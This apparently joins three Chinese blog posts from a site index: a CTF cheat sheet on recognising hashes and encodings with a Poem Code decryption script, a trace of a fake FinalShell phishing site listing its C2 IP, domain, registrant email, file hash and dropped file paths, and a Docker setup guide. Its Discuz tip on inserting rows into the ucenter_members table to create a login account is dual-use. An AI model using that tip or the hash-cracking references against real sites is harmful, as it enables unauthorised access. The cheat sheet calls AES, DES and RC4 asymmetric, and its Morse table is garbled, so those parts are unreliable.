MD5\n一般MD5值是32位由数字&quot;0-9&quot;和字母&quot;a-f&quot;所组成的字符串，字母大小写统一。如果出现这个范围以外的字符说明这可能是个错误的md5值，就没必要再拿去解密了。\n\n也有可能是MD5&amp;Salt（discuz）\nmd5(md5(password).salt)\nsalt是一个随机的6位字符串，保存在ucenter_members表中。该表和common_member表中都存有password字段，需要注意的是，这两个表中的password字段的值是不一样的，用户在做登录的时候，实际上判断的是ucenter_members表中的密码字段，common_member表中的密码字段是没有意义的，可以任意更改。\n在通过其它途径需要往论坛添加可登录用户的时候，只需要向ucenter_members表中插入数据即可登录，然后登录的时候系统会让该帐号激活，激活成功后即可登录。如果在两张表中都有插入数据的话，用户登录的时候就不需要激活，直接登录。（建议只在一张表中插入数据，激活的时候让系统自动往common_member表中插数据，避免手动插入的数据错乱。）\n\n16位值是取的是8~24位。\n特征：\n有固定长度，一般是32位或者16位\n由数字“0-9”和字母“a-f”组成\n明文：hello，world.123456md5(hello，world.123456,32) = 5189503aae1b1c0a6fbf7ea9e3128ab0md5(hello，world.123456,16) = ae1b1c0a6fbf7ea9\nMD5解密1\nMD5解密2\n SHA1\nSHA1是一种密码散列函数，SHA1可以生成一个被称为消息摘要的160位，20字节的散列值，散列值通常的呈现形式为40位十六进制数。这种加密和MD5类似。\n特征：\n有固定长度，为40位的字符串\n明文：hello，world.123456sha1（hello，world.123456）= 0179303b8f08fbc3d16cd23a4be5828790e12375\nSHA1加解密1\nSHA1加解密2\n HMAC\n简述：\nHMAC（Hash-based Message Authentication Code）常用于接口签名验证，这种算法就是在前两种加密的基础上引入了秘钥，而秘钥又只有传输双方才知道，所以基本上是破解不了的。\n特征：\n和MD5类似，但是有秘钥。\nHAMC加解密\n NTLM\n这种加密是Windows的哈希密码，是Windows NT早期版本的标准安全协议。与它相同的还有Domain Cached Credentials（域哈希）。\nNTML加解密\n 类似加密穷举\n\n\n\n#\n算法\n长度\n\n\n\n\n1\nmd5\n32/16\n\n\n2\nsha1\n40\n\n\n3\nsha256\n64\n\n\n4\nsha512\n128\n\n\n5\nadler32\n8\n\n\n6\ncrc32\n8\n\n\n7\ncrc32b\n8\n\n\n8\nfnv132\n8\n\n\n9\nfnv164\n16\n\n\n10\nfnv1a32\n8\n\n\n11\nfnv1a64\n16\n\n\n12\ngost\n64\n\n\n13\ngost-crypto\n64\n\n\n14\nhaval128,3\n32\n\n\n15\nhaval128,4\n32\n\n\n16\nhaval128,5\n32\n\n\n17\nhaval160,3\n40\n\n\n18\nhaval160,4\n40\n\n\n19\nhaval160,5\n40\n\n\n20\nhaval192,3\n48\n\n\n21\nhaval192,4\n48\n\n\n22\nhaval192,5\n48\n\n\n23\nhaval224,3\n56\n\n\n24\nhaval224,4\n56\n\n\n25\nhaval224,5\n56\n\n\n26\nhaval256,3\n64\n\n\n27\nhaval256,4\n64\n\n\n28\nhaval256,5\n64\n\n\n29\njoaat\n8\n\n\n30\nmd2\n32\n\n\n31\nmd4\n32\n\n\n32\nripemd128\n32\n\n\n33\nripemd160\n40\n\n\n34\nripemd256\n64\n\n\n35\nripemd320\n80\n\n\n36\nsha224\n56\n\n\n37\nsha3-224\n56\n\n\n38\nsha3-256\n64\n\n\n39\nsha3-384\n96\n\n\n40\nsha3-512\n128\n\n\n41\nsha384\n96\n\n\n42\nsha512/224\n56\n\n\n43\nsha512/256\n64\n\n\n44\nsnefru\n64\n\n\n45\nsnefru256\n64\n\n\n46\ntiger128,3\n32\n\n\n47\ntiger128,4\n32\n\n\n48\ntiger160,3\n40\n\n\n49\ntiger160,4\n40\n\n\n50\ntiger192,3\n48\n\n\n51\ntiger192,4\n48\n\n\n52\nwhirlpool\n128\n\n\n53\nmysql\n老MYSQL数据库用的，16位，且第1位和第7位必须为0-8\n\n\n54\nmysql5\n40\n\n\n55\nNTLM\n32\n\n\n56\nDomain Cached Credentials\n32\n\n\n\n 埃特巴什码\n一种古老的加密技术，属于简单替换密码的范畴。其基本原理是，在字母表中，每一个字母都被替换为其在字母表中的对称字母。\n埃特巴什码在线解密\n AES、DES、RC4、Rabbit、3DES型加密\n简述：\n以上都是非对称性加密算法，就是引入了密钥，密文特征与Base64类似。\n非对称加密\nRabbit加密开头部分通常为U2FsdGVkX\n Unicode编码\nUnicode（统一码、万国码、单一码）是一种在计算机上使用的字符编码。\n它用两个字节来编码一个字符，字符编码一般用十六进制来表示。\n明文：hello，world.&amp;#x [hex]：&amp;#x0068;&amp;#x0065;&amp;#x006C;&amp;#x006C;&amp;#x006F;&amp;#xFF0C;&amp;#x0077;&amp;#x006F;&amp;#x0072;&amp;#x006C;&amp;#x0064;&amp;#x002E;&amp;# [hex]：&amp;#00104;&amp;#00101;&amp;#00108;&amp;#00108;&amp;#00111;&amp;#65292;&amp;#00119;&amp;#00111;&amp;#00114;&amp;#00108;&amp;#00100;&amp;#00046;\\u [hex]：\\U0068\\U0065\\U006C\\U006C\\U006F\\U002C\\U0077\\U006F\\U0072\\U006C\\U0064\\U002E\\u+ [hex]：\\U+0068\\U+0065\\U+006C\\U+006C\\U+006F\\U+FF0C\\U+0077\\U+006F\\U+0072\\U+006C\\U+0064\\U+002E\nunicode16进制\nunicode\n常见\\u方式\n HTML实体编码\n字符实体是用一个编号写入HTML代码中来代替一个字符，在使用浏览器访问网页时会将这个编号解析还原为字符以供阅读。\n明文：hello，world.十进制：&amp;#104;&amp;#101;&amp;#108;&amp;#108;&amp;#111;&amp;#65292;&amp;#119;&amp;#111;&amp;#114;&amp;#108;&amp;#100;&amp;#46;十六进制：&amp;#x68;&amp;#x65;&amp;#x6C;&amp;#x6C;&amp;#x6F;&amp;#xFF0C;&amp;#x77;&amp;#x6F;&amp;#x72;&amp;#x6C;&amp;#x64;&amp;#x2E;\nHTML实体加解密1\nHTML实体加解密2\n Escape、Unescape编码（%u）\nEscape/Unescape加密解码/编码解码，又叫%u编码，其实就是字符对应UTF-16 16进制表示方式前面加%u。\nUnescape解码/解密就是去掉&quot;%u&quot;后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符&quot;中&quot;，UTF-16BE是：“6d93”，因此Escape是“%u6d93”，反之也一样。\n明文：hello，world.密文：%u0068%u0065%u006c%u006c%u006f%uff0c%u0077%u006f%u0072%u006c%u0064%u002e\nEscape编码/解码\n URL编码\nurl编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURL、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%如空格字符，ascii码是32，对应16进制是20，那么urlencode编码结果是：%20。\nURL加解密\n Hex编码\nHex全称是Intel HEX。Hex文件是由一行行符合Intel HEX文件格式的文本所构成的ASCII文本文件。在Intel HEX文件中，每一行包含一个HEX记录。这些记录由对应机器语言码和/或常量数据的十六进制编码数字组成。\n特征：\n十六进制（Hexadecimal）\n由0-9，A-F组成，字母不区分大小写\n与10进制的对应关系是：0-9不变，A-F对应10-15\n明文：hello，world.密文（带%）：%68%65%6c%6c%6f%ef%bc%8c%77%6f%72%6c%64%2e密文（不带%）：68656C6C6FEFBC8C776F726C642E\n不带%\n带%\n 文本隐藏加密\n特征：\n加密过的密文会比原文的字节数多，当你按删除键的时候会发现某一处要按好多下才能把前面的字删掉\n原理：\n在密文中加入了不可见字符组成的编码，例如上述看似九个字符的一句话，通过字数查询可知它实际上有87个字符，多出的字符是由零宽空格实现的编码，因为零宽空格不占据空间，所以看不出它的存在。\n在进行文本隐藏加密时，将需要隐藏的文字写在括号中，就像这样“你好（有才华），我好喜欢你（画的画）！”，然后加密即可隐藏括号内的文字。同时可以设定一个密码，这样只有知道密码的人才能解密隐藏的文字。密码可以是数字、字母和下划线，最多九位。\n文本隐藏加密\n 零宽隐写\n特征：\n解密后明文与密文会分开显示，密文一般隐藏在第一个字后面\n这里加密过的密文在文本隐藏加密中解不出来\n零宽隐写\n js专用加密\n JS颜文字加密\n特征：\n一堆颜文字构成的js代码，在F12中可直接解密执行\nJS颜文字加密\n解密在F12的console中\n Jother编码\njother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。\n特征：\n只用**!+()[]{}**这八个字符就能完成对任意字符串的编码。可在F12中解密执行\nJother\n JSFuck编码\n特征：\n与jother很像，只是少了{}\nJSFuck加密\n解密在F12的console中\n Quoted-printable编码\n它是多用途互联网邮件扩展（MIME）一种实现方式。有时候我们可以邮件头里面能够看到这样的编码。\n特征：\n任何一个8位的字节值可编码为3个字符：一个等号&quot;=&quot;后跟随两个十六进制数字(0–9或A–F)表示该字节的数值。\n明文：天上掉下了个猪八戒密文：=E5=A4=A9=E4=B8=8A=E6=8E=89=E4=B8=8B=E4=BA=86=E4=B8=AA=E7=8C=AA=E5=85=AB=E6=88=92\n在线编码\n XXencode\nXXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部分用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。\n特征：\n字符范围是：0-9，A-Z，a-z一共64个字符。\n跟base64打印字符相比，就是UUencode多一个&quot;-“字符，少一个”/&quot;字符。\n明文：hello，world.密文：BO4JgP4yXf5RjQalY9U++\nUUencode加解密\n UUencode\nUUencode是一种二进制到文字的编码，最早在unix邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。\n明文：hello,world.密文：,:&amp;5L;&amp;\\L=V]R;&amp;0N\nUUencode1\nUUencode2\n aaencode编码\n特征：\n将JS代码转换成常用的网络表情。\naaencode1\naaencode2\naaencode3\n jjencode编码\n特征：\n将JS代码转换成只有符号的字符串。\njjencode加密\njjencode解密\n brainfuck编码\nBrainfuck是一种极小化的计算机语言，按照&quot;Turing complete（完整图灵机）&quot;思想设计的语言，它的主要设计思路是：用最小的概念实现一种&quot;简单&quot;的语言。\n特征：\nBrainFuck语言只有八种符号，所有的操作都由这八种符号 (&gt; &lt; + - . , [ ]) 的组合来完成。\n明文：hello,world.密文：+++++ +++++ [-&gt;++ +++++ +++&lt;] &gt;++++ .---. +++++ ++..+ ++.&lt;+ +++++ ++[-&gt;----- ---&lt;] &gt;---. &lt;++++ ++++[ -&gt;+++ +++++ &lt;]&gt;++ +++++ ++++. ----- ---.+++.-- ----. ----- ---.&lt; +++++ ++[-&gt; ----- --&lt;]&gt; ----- .&lt;\nBrainfuck1\nBrainfuck2\n Ook!编码\n它与Brainfuck完全相同，只是说明被改成了Orangutan单词。它代表了一长串Brainfuck命令替换中的第一个。因此，它是TrivialBrainfuckSubstitution编程语言家族的一员。\nOok!\n 摩斯电码\n摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：\n\n点（.）\n划（-）\n每个字符间短的停顿（通常用空格表示停顿）\n每个词之间中等的停顿（通常用/划分）\n以及句子之间长的停顿\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nA .-\nB -…\nC -.-.\nD -…\nE .\nF …-.\nG –.\nH ….\nI …\nJ .—\n\n\nK -.-\nL .-…\nM –\nN -.\nO —\nP .–.\nQ –.-\nR .-.\nS …\nT -\n\n\nU …-\nV …-\nW .–\nX -…-\nY -.–\nZ –…\n0 —–\n1 .—-\n2 …—\n3 …–\n\n\n4 ….-\n5 ……\n6 -….\n7 –…\n8 —…\n9 —-.\n. .-.-.-\n, –…–\n? …–…\n- -….-\n\n\n= -…-\n: —…\n; -.-.-.\n( -.–.\n) -.–.-\n/ -…-.\n“ .-…-.\n$ …-…-\n‘ .—-.\n¶ .-.-…\n\n\n_ …–.-\n@ .–.-.\n! —.\n! -.-.–\n+ .-.-.\n~ .-…\n# …-.-\n&amp; . …\n⁄ -…-.\n\n\n\n\n特征：\n由 . - “空格” / 表示。\n莫斯电码1\n莫斯电码2\n 社会主义编码\n特征：\n字符全部是社会主义核心价值观。\n社会主义编码\n 与佛论禅\n特征：\n密文以&quot;佛曰：&quot;开头，密文一般是与关佛经的汉字\n与佛论禅\n 新与佛论禅\n新约佛论禅加密算法，简称&quot;新佛曰&quot;。相较于佛曰算法而言，在链接加密方面拥有更高的压缩率。\n特征：\n密文以&quot;新佛曰：&quot;开头，密文一般是与关佛经的汉字\n新与佛论禅\n 百家姓暗号\n百家姓\n 卡尔达诺栅格码\n特征：\n把明文伪装成垃圾邮件\n解密\n 文本加密为汉字\n解密\n 汉信码\n汉信码与现有二维码相比较，具有如下特点：\n\n\n汉字编码能力强：支持GB18030中规定的160万个汉字信息字符，采用12位二进制数进行表示，在现有的二维码中表示汉字效率最高。\n\n\n信息容量大：最多可表示7829个数字、4350个ASCII字符、2174个汉字、3262个8位字节信息\n\n\n编码范围广：可以对照片、指纹、掌纹、签字、声音、文字等数字化信息进行编码。\n\n\n抗污损、抗畸变识读能力强：能够容忍较大面积的符号污损，特别适合在恶劣条件下使用。\n\n\n具备纠错能力：具备四种纠错等级：8%、15%、23% 、30%，不输QR码。\n\n\n识读速度快：汉信码的识读速度比国际上的主流二维码DataMatrix还要高。\n\n\n\n汉信码\n Whitespace加密\n大多数的编程语言都会忽略代码中的空白字符，&quot;Whitespace&quot;是专门来弥补普通编程语言，它给予这些空白字符最重要的地位。\n在&quot;Whitespace&quot;编程语言中，任何非空白的字符都是被忽略的，只有空格符、tab和换行符被认为是有效的语义字符。\nWhitespace\n 后端代码加密\nPHP：乱码，头部有信息\n.NET：DLL封装代码文件（dnSpy、ILSpy）\nJAVA：JAR&amp;CLASS文件\n举例：Zend  ILSpy  IDEA\n应用场景：版权代码加密，开发特性等\n Poem Code\n\n链接\n\n 加密原理\n\n选诗歌和关键词\n\n首先，选好一首诗，不要求完整，可以只是片段。PoemCode加密本质上只是想在这首诗里找几个词作为关键词，为后面的加密做准备\n\n选一首《Right Here Waiting》的歌词做加密用的诗歌，再选几个关键词（下面标成黄色的）：\nOceans apart day after day\nAnd I slowly go insane\nI hear your voice on the line\nBut it doesn’t stop the pain\nIf I see you next to never\nHow can we say forever\n\n\n给关键词的每个字母标号\n\n\n把所有关键词按照在诗歌中出现的顺序排在一起，中间不要空格，如下：\n\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n\n按照字母表的顺序，从a开始，用1，2，…依次给每个字母编号（注意：相同的字母按从左到右的顺序依次标号）\n先标a\n\n\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n\n1\n\n\n\n\n\n\n\n\n\n2\n\n\n\n\n\n\n\n\n没b，c就到d：\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n3\n1\n\n\n\n\n\n\n\n\n\n2\n\n\n\n\n\n\n\n\n再到e：\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n3\n1\n\n\n\n\n\n\n\n\n4\n2\n\n\n\n\n5\n\n\n\n最后结果：\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n3\n1\n16\n14\n8\n12\n15\n9\n17\n6\n4\n2\n13\n10\n7\n11\n5\n\n\n\n\n\n密文对号入座\n\n设我们要传的密文是：Remember me though I have to say goodbye.\n\n\n\n去掉空格和特殊符号\n\n很多时候，还会统一大小写\n\n明文经过这一步处理得到的是：remembermethoughihavetosaygoodbye\n\n\n对号入座\n首先，看关键词一共有多少个字母，day：3个，slowly：6个，hear：4个，line：4个，一共17个。\n这个从上一步的标号也可以看出，因为标号最大是17\n创建一个这样的表格，列数为字母个数，分别标上1-17，再把需要加密的内容从左到右，从上到下依次放进去。如果最后一行没满，就随机填充字母，一般都默认用abcdef…下面第二行最后那个a就是填充字符\n\n\n\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n\nr\ne\nm\ne\nm\nb\ne\nr\nm\ne\nt\nh\no\nu\ng\nh\ni\n\n\nh\na\nv\ne\nt\no\ns\na\ny\ng\no\no\nd\nb\ny\ne\na\n\n\n\n\n\n明文转密文\n用上面每列字母去代替关键词（dayslowlyhearline）中相应标号的字母，即：\n关键词中第一个字母（d）的标号是3，那我们就用第3列的mv取代之\n关键词中第二个字母（a）的标号是1，那我们就用第1列的rh取代之\n关键词中第三个字母（y）的标号是16，那我们就用第16列的he取代之\n以此类推\n原本的关键词就会被替换成：mvrhheubrahogymyiaboeeeaodegestomt\n\n一般习惯把密文以4个字母为一组分块（PS：几个字母一组不影响解密，但是每块里面的字母个数必须可以被总数整除，否则最后一块就缺了）\n此例中，有17列，2行，所以字母总数是34，选2为因子分组\n\n分块后就长这样：mv rh he ub ra ho gy my ia bo ee ea od eg es to mt\n\n\n添加密钥\n\n要让对方收到你的密文之后可以解密，别忘了还得告诉他你选了哪几个关键词\n\n实现方法就是在上面分好块的密文前面再加上一块字母\n\n这块字母的个数为关键词的个数，与密文每块字母的个数无关\n\n这块字母在字母表中的顺序就代表关键词在诗歌中的顺序\n\n比如acm代表选择了诗歌中的第1、第3和第13个单词作为关键词。此例中，day是第3个词，slowly是第8个词，hear是第12个词，line是第17个词，所以加上的字母块就是chlq\n\n接收方收到的密文就是： chlq mv rh he ub ra ho gy my ia bo ee ea od eg es to mt\n\n如果选了大于字母表中的字母个数个词作为关键词，模26\n例如选第33个词作为关键词，用第33%26=7个字母，也就是’g’来表示\n\n\n 解密原理\n收到的诗歌+密文如下\nOceans apart day after dayAnd I slowly go insaneI hear your voice on the lineBut it doesn&#x27;t stop the painIf I see you next to neverHow can we say forevercypher text: chlq mv rh he ub ra ho gy my ia bo ee ea od eg es to mt\n\n\n根据第一块字母提取出关键词\n第一块字母为：chlq，在字母表中的顺序分别为：3,8,12,17，诗歌中一共有35个单词，所以\n第一个关键词可能是第3个词“day”，也可能是第3+26=29个词“to”\n第二个关键词可能是第8个词“slowly”，也可能是第8+26=34个词“say”\n第三个关键词只可能是第12个词“hear”，因为诗歌没有第12+26=38个单词\n第四个关键词只可能是第17个词“line”，因为诗歌没有第17+26=43个单词\n综上，关键词的组合有2 *2 *1 *1=4种\n\n\n筛选可能的关键词组合\n根据上一步得到四种关键词组合：1.dayslowlyhearline 2.daysayhearline 3.toslowlyhearline 4.tosayhearline\n为方便讲述，定义几个量：\nCN=明文数据字母数+填充数据字母数KN=关键词字母数\n密文除了第一块表示密钥，后面都是经加密的明文数据+填充数据。所以根据3.2中的表格和2.2节我们知道：\nKN*行数=CN，即CN为KN的倍数\n\n上面例子中密文内容除掉提示关键词的chlq，剩下的经加密的明文数据+填充数据一共有34个字母（CN=34），为mv rh he ub ra ho gy my ia bo ee ea od eg es to mt\n意味着，所有的关键词的字母加起来的个数（KN），应该可以被34整除\n一个个来看刚刚的4个组合：\n第一个，dayslowlyhearline，KN=17，17可以被34整除，可能是解密的关键词组合\n第二个，daysayhearline，KN=14，14不可以被34整除，所以这不是解密的关键词组合\n第三个，toslowlyhearline，KN=15，15不可以被34整除，所以这不是解密的关键词组合\n第四个，tosayhearline，KN=13，13不可以被34整除，所以这不是解密的关键词组合\n\n\n\n给筛选出来的关键词字母标号\n标号规则和加密的步骤2一样，得到的结果如下：\n\n\n\n\n\nd\na\ny\ns\nl\no\nw\nl\ny\nh\ne\na\nr\nl\ni\nn\ne\n\n\n\n\n3\n1\n16\n14\n8\n12\n15\n9\n17\n6\n4\n2\n13\n10\n7\n11\n5\n\n\n\n\n\n找到密文和标号的对应关系\n\n以KN为列数，列的标号顺序同关键词字母标号顺序，CN/KN为行数，列一个表格如下\n\n\n\n\n\n\n3\n1\n16\n14\n8\n12\n15\n9\n17\n6\n4\n2\n13\n10\n7\n11\n5\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n把密文从左到右按列的填入（不用管标号）\n密文：mv rh he ub ra ho gy my ia bo ee ea od eg es to mt\n\n\n\n\n\n3\n1\n16\n14\n8\n12\n15\n9\n17\n6\n4\n2\n13\n10\n7\n11\n5\n\n\n\n\nm\nr\nh\nu\nr\nh\ng\nm\ni\nb\ne\ne\no\ne\ne\nt\nm\n\n\nv\nh\ne\nb\na\no\ny\ny\na\no\ne\na\nd\ng\ns\no\nt\n\n\n\n\n将表格列数标号从小到大重排\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n\nr\ne\nm\ne\nm\nb\ne\nr\nm\ne\nt\nh\no\nu\ng\nh\ni\n\n\nh\na\nv\ne\nt\no\ns\na\ny\ng\no\no\nd\nb\ny\ne\na\n\n\n\n\n按行读取得到明文\n\n 解密代码\n\n需要两个参数：\n\n诗歌的路径，诗歌文本要去掉逗号之类的特殊字符，但空格不能去掉\n密文的路径，密文文本要去掉前面冗余的数据（比如&quot;cypher text:&quot;），只留下密文内容\n\n\nimport sysimport itertoolsimport refrom os import listdirfrom os.path import isfile, join# modified by Clover on 2022/05/23abc=&#x27;abcdefghijklmnopqrstuvwxyz&#x27;def loadlist(infile):\ttlist = []\tfor line in open(infile,&#x27;r&#x27;):\t\tfor w in line.split(): tlist.append(w.lower())\treturn tlistdef decrypt(poem, cip):\t# Load all words of the poem into a temporary list\ttwords = loadlist(poem)\t# Load all cipher chunks of the ciphertext into a list\tcwords = loadlist(cip)\t# Get the code rom the first chunk and remove it from the ciphertext list\tcode = []\tfor i in cwords.pop(0): #get keywords tips\t\tcode.append(abc.index(i))\t# Select only those words specified in the code in a new multi-arrayed list\txwords = [[] for x in range(len(code))]\tfor xcount, c in enumerate(code):\t\ttlen = c\t\twhile(c&lt;len(twords)):\t\t\txwords[xcount].append(twords[c].lower())\t\t\tc+=26\t# Get all possible combinations\tCN=len(cwords)*len(cwords[0])\tfor comb in itertools.product(*xwords):\t\tpwords = &#x27;&#x27;\t\tfor c in comb: pwords+=c\t\tKN = len(pwords)\t\tif CN%KN!=0 : continue\t\t\t\t#re-devide the cyber text by CN/KN\t\tc_text=&#x27;&#x27;\t\tfor i in range(0,len(cwords)):\t\t\tc_text+=cwords[i]\t\tc_text_list = re.findall(r&#x27;\\w&#123;&#x27;+str(CN/KN)+&#x27;&#125;&#x27;, c_text)\t\t# Rearrange the chunks according to the key\t\tpcode = [None] * KN#len of pcode is equal to the numbers in keywords group\t\tcount = 0\t\twhile(count&lt;KN):\t\t\tfor al in abc:\t\t\t\tfor pc, pl in enumerate(pwords):\t\t\t\t\t\t\t\t\t\tif al!=pl: continue\t\t\t\t\tpcode[count]=c_text_list[pc]#put cyber-text blocks in the right position\t\t\t\t\tcount+=1\t\t# Decrypt the ciphertext\t\tmsg = &#x27;&#x27;\t\tfor c in range(0, CN/KN):\t\t\tfor word in pcode:\t\t\t\tmsg+=word[c]\t\tprint msg# first argument = poem# second argument = ciphertxt or msgif len(sys.argv) != 3: sys.exit(2)decrypt(sys.argv[1], sys.argv[2])\n","tags":["CTF","Summary"]},{"title":"FinalShell溯源小记","url":"/2025/04/04/FinalShell%E6%BA%AF%E6%BA%90%E5%B0%8F%E8%AE%B0/","content":" FinalShell溯源小记\n4月3日看到了火绒安全发布的文章《伪FinalShell官网“钓鱼”，后门病毒窃密企业SSH凭证》，针对附录的C2服务器，于清明假期尝试复现\n首先这个是FinalShell的钓鱼页面（https://finalshell.cn/）（页面真的很粗糙，图片都超出了页面范围）\n\n\n这个是官方页面（https://www.hostbuf.com/）\n\n下载macOS和Linux版本，结果压缩包出来都是.exe（幽默exe）\n\n针对网站进行whois查询，得到相关信息\n\nCNNIC（China Internet Network Information Center）中国互联网络信息中心\n\n\n（朋友告诉我CNNIC不免费提供whois保护，所以.cn的域名便宜）\n\n\n\n信息项\n详细信息\n\n\n\n\n注册人\n刘璐\n\n\n邮箱\na8ddos@gmail.com\n\n\nDNS查询\n38.55.144.167\n\n\n\n此外，在微步的报告里可以看到以下IOC\n38.46.10.130bossex.trc.tws1.star1ine.comSHA256：143843a023169f0ded6cd4abb5c9c6d5217ec83ff090d0613ee39603e9a30f7f\n对这个IP进行扫描端口发现只有一个54端口开放\n 处置建议\n封禁双向出口\n\n以下参考自微步\n\n删除文件：\n\nC:\\Users\\Administrator\\Desktop\\Final shell.lnk\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-5JFKI.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-A54UQ.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-F6HFH.tmp\nC:\\Users\\Administrator\\AppData\\Local\\Temp\\is-1NSMJ.tmp\\Fianl_shell.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\bKrnW\\YukXMio\\is-155UO.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-E5Q5A.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-77NMA.tmp\nC:\\Users\\Administrator\\AppData\\Local\\Temp\\is-5PLC8.tmp_isetup_setup64.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-5JFKI.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-A54UQ.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-F6HFH.tmp\nC:\\Users\\Administrator\\AppData\\Local\\Temp\\is-1NSMJ.tmp\\Fianl_shell.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\bKrnW\\YukXMio\\is-155UO.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-E5Q5A.tmp\nC:\\Users\\Administrator\\AppData\\Roaming\\a2534\\LVPWyh\\is-77NMA.tmp\nC:\\Users\\Administrator\\AppData\\Local\\Temp\\is-5PLC8.tmp_isetup_setup64.tmp\n\n 参考链接\n伪FinalShell官网“钓鱼”，后门病毒窃密企业SSH凭证（有详细的逆向分析）\n","tags":["Cyber Security"]},{"title":"Docker","url":"/2024/03/20/Docker/","content":" Docker\n官网：https://www.docker.com/\n文档地址：https://docs.docker.com/\n仓库地址：https://hub.docker.com/\n容器化技术不是模拟完整的一个操作系统\n 架构\n\n镜像(Image)：Dockers镜像(Image)，相当于是一个root文件系统，比如官方镜像Ubuntu 16.04就包含了一套Ubuntu 16.04最小系统的root文件系统，好比是一个模板，通过这个镜像可以创建容器服务，tomcat ==&gt; run ==&gt;tomcat01容器（提供服务的）通过这个镜像可以创建多个容器\n容器(Container)：镜像(Image)和容器(Container)的关系，就像是面向对象程序设计中的类和实例一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建，启动，停止，删除，暂停等\n仓库(Repository)：仓库可以看成一个代码控制中心，用来保存镜像。分为共有仓库和私有仓库\n\nDocker使用Client-Server(C/S)架构模式，使用远程API来管理和创建\nDocker容器。\nDocker容器通过Docker镜像来创建。\n容器与镜像的关系类似于面向对象编程中的对象和类\n 安装\n\n卸载旧的版本\n\nyum remove docker \\                  docker-client \\                  docker-client-latest \\                  docker-common \\                  docker-latest \\                  docker-latest-logrotate \\                  docker-logrotate \\                  docker-engine\n\n需要的安装包\n\nyum install -y yum-utils\n\n设置镜像仓库\n\nyum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo\n\n更新yum包索引\n\nyum makecache fast\n\n安装Docker\n\nyum install docker-ce docker-ce-cli containerd.io\n\n启动Docker\n\nsystemctl start docker\n\n检查是否安装成功\n\ndocker version\n\n测试hello world\n\ndocker run hello-world\n\n查看镜像\n\ndocker images\n\n配置阿里云镜像加速\n\n\n登录-容器镜像服务-镜像加速器\nsudo mkdir -p /etc/dockersudo tee /etc/docker/daemon.json &lt;&lt;-&#x27;EOF&#x27;&#123;&quot;registry-mirrors&quot;: [&quot;https://l3r9ab0o.mirror.aliyuncs.com&quot;]&#125;EOFsudo systemctl daemon-reloadsudo systemctl restart docker\n\n\n卸载Docker\n\n卸载依赖\n\nyum remove docker-ce-cli containerd.io\n\n删除运行环境\n\nrm -rf /var/lib/docker# /var/lib/docker Docker默认工作路径\n\n 命令\n帮助文档地址：https://docs.docker.com/reference/\n 帮助命令\ndocker version #显示docker版本信息docker info #显示docker系统信息，包括镜像和容器的数量docker 命令 --help #帮助命令\n 镜像命令\n\ndocker images：查看主机本地上的镜像\n\n-a：列出所有镜像\n-q：只显示镜像id\n\n\ndocker search 镜像名：搜索镜像\n\n– filter=过滤的条件=具体的值：设置过滤选项\n\n\ndocker pull 镜像名：下载镜像\n\n:tag：下载指定版本\n\n\n\n[root@jackie /]# docker pull mysql:5.75.7: Pulling from library/mysql72a69066d2fe: Pull complete #分层下载，docker image的核心 联合文件系统93619dbc5b36: Pull complete 99da31dd6142: Pull complete 626033c43d70: Pull complete 37d5d7efb64e: Pull complete ac563158d721: Pull complete d2ba16033dad: Pull complete 0ceb82207cd7: Pull complete 37f2405cae96: Pull complete e2482e017e53: 